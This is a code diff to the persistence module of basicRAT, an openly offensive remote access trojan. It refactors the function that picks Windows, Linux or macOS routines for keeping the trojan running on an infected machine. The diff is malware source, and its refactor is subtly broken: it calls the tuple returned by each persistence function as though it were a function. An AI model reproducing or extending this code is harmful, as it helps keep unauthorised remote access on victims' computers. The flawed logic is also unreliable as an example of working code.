@@ -5,8 +5,6 @@
 # https://github.com/vesche/basicRAT
 #
 
-import sys
-
 
 def windows_persistence():
     import _winreg
@@ -32,14 +30,20 @@ def mac_persistence():
     return False, 'nothing here yet'
 
 
-def run():
-    if sys.platform.startswith('win'):
-        success, details = windows_persistence()
-    elif sys.platform.startswith('linux'):
-        success, details = linux_persistence()
-    elif sys.platform.startswith('darwin'):
-        success, details = mac_persistence()
+def run(platform):
+    if platform.startswith('win'):
+        apply_persistence = windows_persistence()
+    elif platform.startswith('linux'):
+        apply_persistence = linux_persistence()
+    elif platform.startswith('darwin'):
+        apply_persistence = mac_persistence()
     else:
-        success, details = False, 'platform unsupported'
+        return 'Error, platform unsupported.'
 
-    return success, details
+    success, details = apply_persistence()
+    if success:
+        results = 'Persistence successful, {}.'.format(details)
+    else:
+        results = 'Persistence unsuccessful, {}.'.format(details)
+
+    return results
